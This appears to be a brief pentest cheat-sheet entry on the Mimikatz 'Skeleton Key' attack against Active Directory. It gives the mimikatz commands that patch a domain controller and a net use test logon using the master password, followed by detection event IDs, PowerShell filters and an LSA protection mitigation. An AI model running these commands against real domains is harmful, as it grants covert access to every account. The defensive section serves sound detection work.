### Skeleton Key
#### Preq
mimikatz  
Domain Admin rights  
### Mimi
``privilege::debug``
``misc::skeleton``
### Test
``net use _DRIVE_:\\_DC_\c$ /user:_DOMAIN_\administrator mimikatz``
### Defend
#### Moinitor Events:  
System Event ID 7045 - A service was installed in the system. (Type Kernel Mode driver)  
Security Event ID 4673 – Sensitive Privilege Use ("Audit privilege use" must be enabled)  
Event ID 4611 – A trusted logon process has been registered with the Local Security Authority ("Audit privilege use" must be enabled)  
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "Kernel Mode Driver"}  
This only detect mimidrv Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$.message -like "Kernel Mode Driver" -and $.message -like "mimidrv"}  
#### Mitigation:  
Run lsass.exe as a protected process, it forces an attacker to load a kernel mode driver  
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -Verbose  
Verify after reboot: Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "protected process"}  
